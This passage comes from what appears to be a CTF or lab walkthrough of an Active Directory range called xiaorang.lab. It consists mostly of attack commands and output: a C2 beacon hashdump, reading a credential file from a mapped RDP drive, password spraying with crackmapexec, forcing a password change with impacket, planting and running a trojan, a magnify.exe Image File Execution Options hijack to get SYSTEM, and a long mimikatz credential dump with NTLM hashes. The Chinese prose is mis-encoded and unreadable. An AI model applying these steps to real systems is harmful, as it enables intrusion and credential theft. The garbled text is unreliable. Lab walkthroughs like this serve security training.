class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: 82541 bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹johnåœ¨ä¸åœ¨çº¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°johnåœ¨çº¿ï¼Œå°è¯•æ³¨å…¥è¿›ç¨‹ä¸Šçº¿ï¼Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444487178-f46b1ee9-8cae-4516-8c27-fdbfaa35c59e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444718790-7ec5853d-4274-41d0-89f1-5d6beac98d4b.png"></p><p>çœ‹ä¸€ä¸‹ç½‘ç»œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444913017-4d52ed6c-9bbb-4777-a74a-c3d27f969e74.png"></p><p>è¯»å–ä¸€ä¸‹å…±äº«æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\TSCLIENT\C</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445001474-2d5f5420-ae6c-449f-88dc-e0ef461980c5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741445055034-473b7f38-cc62-4455-b4f4-e799c249b3de.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure><p>æç¤ºæ˜ åƒåŠ«æŒï¼Œèµ·ä¸ªä»£ç†,kaliå¯†ç å–·æ´’ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741446240773-bb137f87-a0c6-4990-b0b8-181e6672be95.png"></p><p>ç™»é™†çš„è¯ä¼šè¿‡æœŸï¼Œè¿™è¾¹kalirdpç™»é™†æ”¹å¯†ç å’Œåˆ©ç”¨impacketæ”¹éƒ½å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbpasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Calmsec1!&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.46</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741447925599-9ba3f1fa-aa1b-4a14-8662-09aabef0462a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.15 rdpä¸ä¸Š</span><br><span class="line">172.22.8.31 ç™»ä¸äº†</span><br><span class="line">172.22.8.46 æˆåŠŸç™»å½•</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç¬¬ä¸€å°winè½¬å‘ä¸Šçº¿ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448063842-2e1fa2df-6c72-4884-8b10-a5ec19dae597.png"></p><p>å†ç”¨è¿™ä¸ªç›‘å¬å™¨ï¼Œç”Ÿæˆä¸ªé©¬</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448135705-8c08e0d8-23dd-4cb0-af1d-dcbb1cd1d9e5.png"></p><p>æŠŠç”Ÿæˆçš„ğŸä¼ åˆ°8.46ä¸Šå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448228147-a182c7cf-589f-4f6b-b37e-f9d48fb7c722.png"></p><p>è¿è¡Œä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448264695-8356a888-7f2f-45b4-93e7-f57090fa4043.png"></p><h2 id="æ˜ åƒåŠ«æŒ"><a href="#æ˜ åƒåŠ«æŒ" class="headerlink" title="æ˜ åƒåŠ«æŒ"></a>æ˜ åƒåŠ«æŒ</h2><p>æ˜ åƒåŠ«æŒææƒï¼Œå…ˆæŸ¥çœ‹æƒé™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448348642-c2c5ed78-479c-4d44-bcfc-35bc9d0c7e15.png"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°æ‰€æœ‰æ­£å¸¸ç™»å½•çš„ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œä¿®æ”¹æ³¨å†Œè¡¨æ˜ åƒåŠ«æŒï¼Œä½¿ç”¨æ”¾å¤§é•œè¿›è¡Œææƒï¼Œå…¶å®ä¹Ÿå°±æ˜¯æŠŠæœ¬æ¥ç”¨æˆ·ä¸»é¡µç‚¹æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\windows\system32\cmd.exeï¼Œè¿™æ ·å°±ç›´æ¥ææƒæˆsystemäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448414949-60f9ecb4-bc63-4823-a9d5-771bb3ee383b.png"></p><p>æ¥ç€é”å®š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448467481-3bef3f71-fc9b-42b7-aede-ef0c42ea7634.png"></p><p>ç‚¹ä¸€ä¸‹æ”¾å¤§é•œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448495441-30436640-c5bf-4733-a638-ea73314f06d1.png"></p><p>æ‹¿åˆ°system</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448511939-73fff185-971f-45cd-b2ed-01dba133f81d.png"></p><p>æ­¤æ—¶å†è¿è¡Œä¸Šä¼ çš„é©¬ï¼Œæ‹¿åˆ°systemçš„ğŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741448672587-ff6a7d36-7d89-44b7-b29f-6aaafd4fc075.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449116342-55a2b929-81fa-449c-ad59-213b9ac3c716.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win2016$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 851871 (00000000:000cff9f)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : Aldrich</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : DC01</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : effdad263995efa4a11f6bc121ef623a</span><br><span class="line"> * SHA1     : 6691986c4240cf9025618b8c34639c226891b86e</span><br><span class="line"> * DPAPI    : 5e4bb4bd0e5ffefa26f4c78b6df8c2a2</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Aldrich</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 829666 (00000000:000ca8e2)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 828954 (00000000:000ca61a)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:33:01</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:53</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54890 (00000000:0000d66a)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span><br><span class="line"> * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 54870 (00000000:0000d656)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:50</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 25098 (00000000:0000620a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 40af44e61e8174dfa92f90a696be81e8</span><br><span class="line"> * SHA1     : 378b412b2e447892d8b92acde54467d5b41f3a3c</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/8 23:26:49</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN2016$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win2016$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : 37 b1 92 79 03 15 71 7b 30 27 db aa bf 8e cb 2b 01 22 6b 2f 20 4d 72 67 e9 99 f1 48 7b f3 31 df d3 b6 c7 67 0e 42 